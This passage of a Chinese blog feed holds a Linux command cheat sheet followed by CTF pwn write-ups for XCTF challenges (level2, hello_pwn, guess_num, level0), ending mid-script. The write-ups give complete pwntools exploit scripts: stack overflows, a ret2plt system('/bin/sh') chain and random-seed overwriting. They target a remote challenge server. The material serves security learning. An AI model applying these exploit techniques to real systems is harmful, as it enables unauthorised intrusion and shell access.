&lt;文件名&gt;</code><br><code>i</code>（进入编辑模式）<br><code>esc</code>（退出编辑模式）<br><code>:q</code>（退出，但不保存）<br><code>:wq</code>（保存并退出）<br><code>esc</code> <code>u</code>（撤销之前的操作）</p></blockquote><hr><h2 id="给文件增加可执行权限"><a href="#给文件增加可执行权限" class="headerlink" title="给文件增加可执行权限"></a>给文件增加可执行权限</h2><blockquote><p><code>chmod a+x &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-elf-可执行文件"><a href="#运行-elf-可执行文件" class="headerlink" title="运行 elf 可执行文件"></a>运行 elf 可执行文件</h2><blockquote><p><code>./ &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-python-程序"><a href="#运行-python-程序" class="headerlink" title="运行 python 程序"></a>运行 python 程序</h2><blockquote><p><code>python3 &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-C-代码"><a href="#运行-C-代码" class="headerlink" title="运行 C 代码"></a>运行 C 代码</h2><blockquote><p><code>gcc &lt;.c文件名&gt; -o &lt;编译生成的文件名&gt;</code><br><code>./&lt;编译生成的文件名&gt;</code></p></blockquote><hr><h2 id="复制-文件-x2F-文件夹"><a href="#复制-文件-x2F-文件夹" class="headerlink" title="复制 文件&#x2F;文件夹"></a>复制 文件&#x2F;文件夹</h2><blockquote><p><code>cp &lt;源文件/源文件夹 路径&gt; &lt;复制到 文件/文件夹&gt;</code></p></blockquote><hr><h2 id="移动、重命名-文件-x2F-文件夹"><a href="#移动、重命名-文件-x2F-文件夹" class="headerlink" title="移动、重命名 文件&#x2F;文件夹"></a>移动、重命名 文件&#x2F;文件夹</h2><blockquote><p><code>mv &lt;源文件/源文件夹 路径&gt; &lt;移动后的 文件/文件夹 路径&gt;</code><br><code>mv &lt;源文件名&gt; &lt;修改后的文件名&gt;</code></p></blockquote><hr><h2 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h2><blockquote><p>1.<code>--purge</code> 是可选项，这个属性是将软件及其配置文件一并删除<br><code>sudo apt-get --purge remove &lt;包名&gt;</code><br>2.如果不需要删除配置文件，则不加 <code>--purge</code> 选项<br><code>sudo apt-get remove &lt;包名&gt;</code></p></blockquote><hr><h2 id="删除文件-x2F-文件夹"><a href="#删除文件-x2F-文件夹" class="headerlink" title="删除文件&#x2F;文件夹"></a>删除文件&#x2F;文件夹</h2><blockquote><p><code>rm -d &lt;目录名&gt;</code>（删除一个空目录）<br><code>rm -r &lt;目录名&gt;</code>（删除一个非空目录）<br><code>rm 文件名</code>（删除文件）</p></blockquote><hr><h2 id="安装-deb-文件包"><a href="#安装-deb-文件包" class="headerlink" title="安装 .deb 文件包"></a>安装 .deb 文件包</h2><blockquote><p><code>sudo dpkg -i &lt;.deb 文件名&gt;</code></p></blockquote>]]></content>
    
    
    <summary type="html">使用 Linux 系统必须要知道的，简单总结了一些常用的命令</summary>
    
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/categories/Linux/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-level2</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-04-14T08:55:21.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>通过构造 ROP 链，<mark>利用 PLT 表找到 system() 函数的地址，执行 system() 函数</mark></p></li><li><p></mark>给 system() 函数构造参数，注意提供函数返回值，<em>保持栈的平衡，需要填充 4个 垃圾数据</em></mark></p></li><li><p>熟悉<mark>使用 exp 获取地址的方法，例如函数的地址、字符串的地址等</mark>；以及<mark>通过 IDA 查看地址的方法</mark>，<em><strong>通过 exp 获取的地址和 IDA 中直接查看的地址是一样的</strong></em></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1ab77c073b4f4524b73e086d063f884e">攻防世界-level2</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/hEpF2m5NqtScRDi.png" alt="攻防世界-level2 1.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行文件：<br><img src="https://s2.loli.net/2023/03/18/gpY9qAnSjwkt7Ur.png" alt="攻防世界-level2 2.png"></p></li><li><p>在 IDA 分析：<br><img src="https://s2.loli.net/2023/03/18/9Q7spCbyUetDFmI.png" alt="攻防世界-level2 3.png"><br>跟进 <code>vulnerable_function()</code>：<br><img src="https://s2.loli.net/2023/03/18/1nldbCxPvzSjkVL.png" alt="攻防世界-level2 4.png"><br>通过 <code>read()</code> 向 <code>buf</code> 写入长度为 0x100 的数据，但是栈中 <code>buf</code> 的长度只有 0x88，可以栈溢出<br>但是没有发现其他执行类似 <code>system(&quot;/bin/sh&quot;)</code> 命令的函数</p></li><li><p>查看字符串发现 “<code>/bin/sh</code>“：<br><img src="https://s2.loli.net/2023/03/18/1WQAi4stcqrj39p.png" alt="攻防世界-level2 5.png"><br><img src="https://s2.loli.net/2023/03/18/hpTQ9quP8twWkcl.png" alt="攻防世界-level2 6.png"><br>只要想办法执行这里的 “<code>/bin/sh</code>“ 即可</p></li><li><p>由于这里给出了 <code>system()</code> 函数，可以利用这个函数执行 sysytem 的命令<br><img src="https://s2.loli.net/2023/03/18/KTeMBRqjnogI7GO.png" alt="攻防世界-level2 7.png"><br>如果将 <code>/bin/sh</code> 作为参数 <code>command</code> 传入 <code>system()</code> 函数，就可以 PWN 掉主机</p></li><li><p>所以<strong>思路</strong>如下：<br> ① 首先需要通过 <code>PLT</code>、<code>GOT</code> 表找到 <code>system()</code> 函数的地址；<br> ② 通过栈溢出实现函数跳转，让程序执行 <code>system()</code> 函数；<br> ③ 再找到 <code>/bin/sh</code> 的地址；<br> ④ 利用 <code>system()</code> 函数将 <code>/bin/sh</code> 执行，就可以实现 PWN 操作</p></li><li><p>查看输入的 buf 在栈中的位置：<br><img src="https://s2.loli.net/2023/03/18/FLMR643pljAaQb1.png" alt="攻防世界-level2 8.png"><br>首先填充 <code>b&#39;a&#39; * (0x88 - 0x00 + 0x04)</code> 个字符，然后接上 <code>system()</code> 函数的地址作为返回值，使程序转而执行 <code>system()</code> 函数</p></li><li><p><mark>至于 <code>system()</code> 函数的地址，可以根据 <code>system_plt_addr = elf.plt[&quot;system&quot;]</code> 从 PLT 表中获取<br>另外，在 IDA 中，直接搜索函数 “system”，可以看到 <code>.plt</code> 段的函数 <code>.system</code> 的地址为 <code>0x08048320</code></mark><br><img src="https://s2.loli.net/2023/03/18/CoumXVFiG6aqeQD.png" alt="攻防世界-level2 9.png"></p></li><li><p><mark>接下来就是给 <code>system()</code> 函数提供参数 <code>/bin/sh</code><br>可以通过 <code>bin_sh_addr = next(elf.search(b&quot;/bin/sh&quot;))</code> 在程序中搜索 <code>/bin/sh</code> 的地址<br>也可以直接在 IDA 中，看到字符串 <code>/bin/sh</code> 的地址为 <code>0x0804A024</code></mark><br><img src="https://s2.loli.net/2023/03/18/tPZeHw4yh8gQGds.png" alt="攻防世界-level2 10.png"></p></li><li><p>注意这里需要用 4 个字节作为 <code>system(&quot;/bin/sh&quot;)</code> 的返回地址，使栈保持平衡</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>     <span class="token comment"># 生成对象elf</span>system_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>     <span class="token comment"># 根据plt表获取system的地址，根据ida可知.plt段指向的.system的地址为0x08048320</span>bin_sh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment"># 在程序中搜寻/bin/sh的地址，根据ida可知地址为0x0804A024</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56085</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口，注意是remote</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt_addr<span class="token punctuation">)</span>    <span class="token comment"># 跳转到system函数的地址，system_plt_addr直接写0x08048320也可以</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填入4个垃圾字符作为返回地址，保持栈平衡，bin_sh_addr直接填0x0804A024也可以</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{437e920e2e285d2484407590036a7d62}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/PYD7Tmt6szAnwBS.png" alt="攻防世界-level2 11.png"></p>]]></content>
    
    
    <summary type="html">发现程序中有 /bin/sh，利用 PLT 表找到 system 函数的地址，然后给 system 函数构造参数来执行</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-hello_pwn</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-03-29T02:42:12.336Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>基础的<mark>栈溢出漏洞</mark></p></li><li><p>熟悉 <mark>exp 的编写</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/4f2f44c9471d4dc2b59768779e378282">攻防世界-hello_pwn</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/ulK38iMZRyt7GJX.png" alt="攻防世界-hello_pwn1.png"><br>64位 小端序，只开启了栈保护，没有金丝雀</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/EZ9ucXyBGk67rlS.png" alt="攻防世界-hello_pwn2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/rAhIFBY7SXEZRGt.png" alt="攻防世界-hello_pwn3.png"><br>通过 <code>read()</code> 从命令行向 <code>unk_601068</code> 的地址处写入 0x10 个值，如果 <code>dword_60106C == 1853186401</code>，就执行 <code>sub_400686()</code> 函数，跟进：<br><img src="https://s2.loli.net/2023/03/18/KwHTAj4QrixDSW6.png" alt="攻防世界-hello_pwn4.png"><br><code>sub_400686()</code> 函数直接 <code>cat flag.txt</code></p></li><li><p>因此，只需要将 <code>dword_60106C</code> 的值设置为 1853186401 就可以得到 flag<br>查看 <code>dword_60106C</code> 存放的位置：<br><img src="https://s2.loli.net/2023/03/18/FvESGUiWz3IsY5c.png" alt="攻防世界-hello_pwn5.png"><br>可以看到 read() 输入的值存放在 <code>unk_601068</code> 的地方就在 <code>dword_60106C</code> 的上方，而 read() 输入的长度为 0x10，因此只需在输入 <code>unk_601068</code> 时溢出修改 <code>dword_60106C</code> 的值即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span> <span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hello_pwn"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">58615</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x60106C</span> <span class="token operator">-</span> <span class="token number">0x601068</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{ff873b571a60849c4df0f263789a392c}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/VawQFHjstdmD5Rk.png" alt="攻防世界-hello_pwn6.png"></p><p>执行了 <code>cat: flag.txt: 没有那个文件或目录</code>，说明本地已经 PWN 通，将 comtent 改为 0：<br><img src="https://s2.loli.net/2023/03/18/STH1NifdcrDQEOe.png" alt="攻防世界-hello_pwn7.png"><br>获得 flag</p>]]></content>
    
    
    <summary type="html">比较基础的栈溢出漏洞，控制程序跳转到后门函数，适合入门和熟悉栈溢出漏洞的原理</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-guess_num</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-04-14T08:57:54.818Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>栈溢出漏洞</mark></p></li><li><p>通过 <mark>Python 实现 C 语言函数的运行</mark>，利用 <code>ctypes</code> 库和 <code>cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></p></li><li><p>通过<mark>编写脚本来 PWN 通程序中函数的逻辑</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/b59204f56a0545e8a22f8518e749f19f">攻防世界-guess_num</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/2CcvqlkIjt4hr5z.png" alt="攻防世界-guess_num1.png"><br>64位 小端序，金丝雀、栈不可执行、地址随机化全都开启</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/3YjyBQtAL4XceOZ.png" alt="攻防世界-guess_num2.png"></p></li><li><p>打开 IDA 分析：<br><img src="https://s2.loli.net/2023/03/18/c1xPTpAjw3eWyXG.png" alt="攻防世界-guess_num3.png"><br>发现随机数种子 <code>seed</code>，且存在 <code>gets()</code> 这种明显的漏洞函数<br>函数 <code>sub_BB0()</code> 用来生成随机数种子：<br><img src="https://s2.loli.net/2023/03/18/opRS6GCUDQiTyf3.png" alt="攻防世界-guess_num4.png"><br>在 <code>puts(&quot;Success!&quot;)</code> 后执行了函数 <code>sub_C3E()</code>，跟进：<br><img src="https://s2.loli.net/2023/03/18/NzqhCAxUBao1Yw6.png" alt="攻防世界-guess_num5.png"><br>该函数会执行 <code>system(&quot;cat flag&quot;)</code>，说明只要让这个函数执行就可以得到 flag，即：保持 <code>for</code> 循环不会中途退出</p></li><li><p>分析 <code>for</code> 循环的逻辑：总共循环 10 次，并且每次循环会根据 <code>v6 = rand() % 6 + 1</code> 生成一个随机数 <code>v6</code>，然后让用户输入一个 <code>v4</code>，只有当 <code>v4 == v6</code> 才能让循环继续下去</p></li><li><p>观察栈中数据的位置：<br><img src="https://s2.loli.net/2023/03/18/xCtyGoNTp7OVUs2.png" alt="攻防世界-guess_num6.png"><br><mark>发现用户输入的 <code>v7</code> 在随机数种子 <code>seed</code> 的上方，而且用户的输入在函数 <code>sub_BB0()</code> 生成随机数种子的操作之后，因此可以通过将 <code>v7</code> 溢出从而修改随机数种子 <code>seed</code> 的值，这样就可以得到 <code>v6 = rand() % 6 + 1</code> 所产生的所有伪随机数，之后编写脚本将所有产生的 <code>v6</code> 作为输入发送过去，就可以实现猜中所有的随机数了</mark></p></li><li><p><strong>注意，在 Python 中，可以通过 <code>from ctypes import *</code> 引入 C 语言库，用 <code>lib = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code>  导入 C 运行库，就可以使用 <code>lib</code> 来执行 C 语言的函数了</strong></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">global</span> io<span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida的伪代码，先将种子设为1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数，即:v6 = rand() % 6 + 1;</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./guess_num"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">49792</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 填充垃圾字符，并将seed覆盖为1</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 第一次输入，可随便输入</span>    srand<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 执行srand函数保证每次都能猜中</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{a1d36b526f5cc7080c63a2338ee0255b}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/1nLR25tdK3Wk8Ne.png" alt="攻防世界-guess_num7.png"></p>]]></content>
    
    
    <summary type="html">按照程序中函数的逻辑，利用 python 编写对应的 C 语言函数来绕过程序的判断</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-level0</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-04-14T08:55:10.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>经典<mark>栈溢出漏洞</mark></p></li><li><p><mark>修改函数跳转地址</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/291721f42a044f50a2aead748d539df0">攻防世界-level0</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/tqTzJC6NZrL2D4M.png" alt="攻防世界-level0 1.png"></p></li><li><p>尝试执行文件：<br><img src="https://s2.loli.net/2023/03/18/XCYvMSiHTmUrWQz.png" alt="攻防世界-level0 2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/4n3Aah9voLgqTwW.png" alt="攻防世界-level0 3.png"><br>首先通过 <code>write()</code> 输出 <code>Hello, World\n</code>，然后执行 <code>vulnerable_function()</code>，跟进：<br><img src="https://s2.loli.net/2023/03/18/MbtcfmFUpR9AosB.png" alt="攻防世界-level0 4.png"><br>通过 <code>read()</code> 输入 <code>0x200</code> 个字符</p></li><li><p>在 IDA 左侧发现一个 <code>callsystem()</code> 函数<br><img src="https://s2.loli.net/2023/03/18/sYOulEvC8ka51SJ.png" alt="攻防世界-level0 5.png"><br>用来执行 <code>system(&quot;/bin/sh&quot;)</code>，而通过正常的 <code>main()</code> 函数是无法执行这个 <code>callsystem()</code> 函数的，因此本题的目的是要想办法修改函数的返回值转而执行 <code>callsystem()</code> 函数</p></li><li><p>查看输入的 <code>buf</code> 在栈中的位置：<br><img src="https://s2.loli.net/2023/03/18/iZ97JXKqN2P6nVS.png" alt="攻防世界-level0 6.png"><br>这里的 <code>r</code> 就是 <code>ret</code>，代表函数的返回地点，因此通过输入 <code>buf</code> 的数据覆盖来修改 <code>r</code> 为 <code>callsystem()</code> 函数的地址，就可以使程序转而执行 <code>callsystem()</code> 函数<br><img src="https://s2.loli.net/2023/03/18/uzx8YQme69ioWyE.png" alt="攻防世界-level0 7.png"></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level0"</span><span class="token punctuation">)</span>   <span class="token comment"># 生成对象elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>     <span class="token comment"># 获取callsystem函数的地址，本题为:0x0400596，在ida中可以看到函数的地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content 